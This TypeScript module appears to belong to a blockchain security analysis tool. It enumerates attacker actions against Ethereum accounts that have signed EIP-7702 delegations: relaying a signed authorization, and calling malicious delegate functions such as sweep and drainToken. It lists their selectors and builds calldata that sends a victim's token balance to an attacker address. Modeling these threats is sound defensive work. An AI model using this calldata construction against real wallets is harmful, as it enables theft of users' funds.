import { encodeFunctionData, PublicClient, Address } from "viem";
import { Action, ActionEnumeration, EIP7702Capability } from "../capability/types.js";
import { ERC20_ABI } from "../capability/abis.js";

export class EIP7702Semantics {
  /**
   * The canonical 6 malicious delegate interface families supported by v1.0 EIP-7702 semantics:
   * 1. sweep(address,address) [0xb8dc491b / 0x89afcb44]
   * 2. sweep(address[]) [0x780469bb]
   * 3. drainToken(address,uint256) [0x9d4323be]
   * 4. sweepERC20(address) [0xe00af4a7]
   * 5. sweepTokens(address) [0xf5f6d3af]
   * 6. sweepTokens(address,uint256) [0xdec66036]
   */
  static readonly MODELED_SELECTORS = [
    "b8dc491b", // sweep(address,address)
    "89afcb44", // sweep(address,address) alternate
    "780469bb", // sweep(address[])
    "9d4323be", // drainToken(address,uint256)
    "e00af4a7", // sweepERC20(address)
    "f5f6d3af", // sweepTokens(address)
    "dec66036", // sweepTokens(address,uint256)
  ] as const;

  static async enumerateActions(
    capability: EIP7702Capability,
    client: PublicClient,
    attacker: Address
  ): Promise<ActionEnumeration> {
    const owner = capability.owner;
    const token = capability.targetToken;

    // 1. Inspect on-chain state of the victim EOA
    const currentNonce = await client.getTransactionCount({ address: owner });
    const currentBytecode = await client.getBytecode({ address: owner });

    const hasDelegation =
      currentBytecode &&
      currentBytecode.length >= 48 &&
      currentBytecode.toLowerCase().startsWith("0xef0100");

    const delegateAddress = hasDelegation
      ? (("0x" + currentBytecode.slice(8, 48)) as Address)
      : capability.delegateAddress;

    // 2. Validate delegate interface support against authoritative modeled selectors
    if (delegateAddress && delegateAddress !== "0x0000000000000000000000000000000000000000") {
      const delegateCode = ((await client.getBytecode({ address: delegateAddress })) || "").toLowerCase();
      if (delegateCode && delegateCode.length > 2) {
        const isSupported = this.MODELED_SELECTORS.some((sel) => delegateCode.includes(sel));
        if (!isSupported) {
          return {
            status: "UNMODELED",
            reason: `Delegate ${delegateAddress} does not expose modeled EIP-7702 action selectors`
          };
        }
      }
    }

    const actions: Action[] = [];

    // Action Type 1: Relay signed authorization via Type-4 transaction
    // Legal if delegation is not active and current on-chain nonce matches capability nonce
    if (!hasDelegation && BigInt(currentNonce) === capability.nonce) {
      const authItem = capability.authorizationObject || {
        address: capability.delegateAddress,
        chainId: Number(capability.chainId),
        nonce: Number(capability.nonce),
        yParity: capability.yParity,
        r: capability.r,
        s: capability.s
      };

      actions.push({
        id: "EIP7702.relayAuthorization",
        description: `Relayer/Attacker broadcasts Type-4 transaction with authorization for delegate ${capability.delegateAddress}`,
        target: owner,
        calldata: "0x",
        value: 0n,
        actor: attacker,
        authorizationList: [authItem]
      });
    }

    // Action Type 2: Execute delegate logic on the delegated EOA
    // Legal if delegation is currently installed on victim EOA and victim holds assets
    let victimBalance = 0n;
    if (token) {
      victimBalance = await client.readContract({
        address: token,
        abi: ERC20_ABI,
        functionName: "balanceOf",
        args: [owner]
      });
    }

    if (hasDelegation && token && victimBalance > 0n) {
      const delegateCode = ((await client.getBytecode({ address: delegateAddress })) || "").toLowerCase();

      // Interface 1: sweep(address,address)
      if (delegateCode.includes("b8dc491b") || delegateCode.includes("89afcb44")) {
        actions.push({
          id: "MaliciousDelegate.sweep",
          description: `Attacker calls sweep(${token}, ${attacker}) on victim EOA context to drain ${victimBalance} tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "sweep",
                inputs: [
                  { name: "token", type: "address" },
                  { name: "to", type: "address" }
                ],
                outputs: []
              }
            ],
            functionName: "sweep",
            args: [token, attacker]
          }),
          value: 0n,
          actor: attacker
        });
      }

      // Interface 2: sweep(address[])
      if (delegateCode.includes("780469bb")) {
        actions.push({
          id: "MaliciousDelegate.sweepArray",
          description: `Attacker calls sweep([${token}]) on victim EOA context to drain tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "sweep",
                inputs: [{ name: "tokens", type: "address[]" }],
                outputs: []
              }
            ],
            functionName: "sweep",
            args: [[token]]
          }),
          value: 0n,
          actor: attacker
        });
      }

      // Interface 3: drainToken(address,uint256)
      if (delegateCode.includes("9d4323be")) {
        actions.push({
          id: "MaliciousDelegate.drainToken",
          description: `Attacker calls drainToken(${token}, ${victimBalance}) on victim EOA context to drain tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "drainToken",
                inputs: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint256" }
                ],
                outputs: []
              }
            ],
            functionName: "drainToken",
            args: [token, victimBalance]
          }),
          value: 0n,
          actor: attacker
        });
      }

      // Interface 4: sweepERC20(address)
      if (delegateCode.includes("e00af4a7")) {
        actions.push({
          id: "MaliciousDelegate.sweepERC20",
          description: `Attacker calls sweepERC20(${token}) on victim EOA context to drain tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "sweepERC20",
                inputs: [{ name: "token", type: "address" }],
                outputs: []
              }
            ],
            functionName: "sweepERC20",
            args: [token]
          }),
          value: 0n,
          actor: attacker
        });
      }

      // Interface 5: sweepTokens(address)
      if (delegateCode.includes("f5f6d3af")) {
        actions.push({
          id: "MaliciousDelegate.sweepTokens",
          description: `Attacker calls sweepTokens(${token}) on victim EOA context to drain tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "sweepTokens",
                inputs: [{ name: "token", type: "address" }],
                outputs: []
              }
            ],
            functionName: "sweepTokens",
            args: [token]
          }),
          value: 0n,
          actor: attacker
        });
      }

      // Interface 6: sweepTokens(address,uint256)
      if (delegateCode.includes("dec66036")) {
        actions.push({
          id: "MaliciousDelegate.sweepTokensAmount",
          description: `Attacker calls sweepTokens(${token}, ${victimBalance}) on victim EOA context to drain tokens`,
          target: owner,
          calldata: encodeFunctionData({
            abi: [
              {
                type: "function",
                name: "sweepTokens",
                inputs: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint256" }
                ],
                outputs: []
              }
            ],
            functionName: "sweepTokens",
            args: [token, victimBalance]
          }),
          value: 0n,
          actor: attacker
        });
      }
    }

    return {
      status: "MODELED",
      actions
    };
  }
}
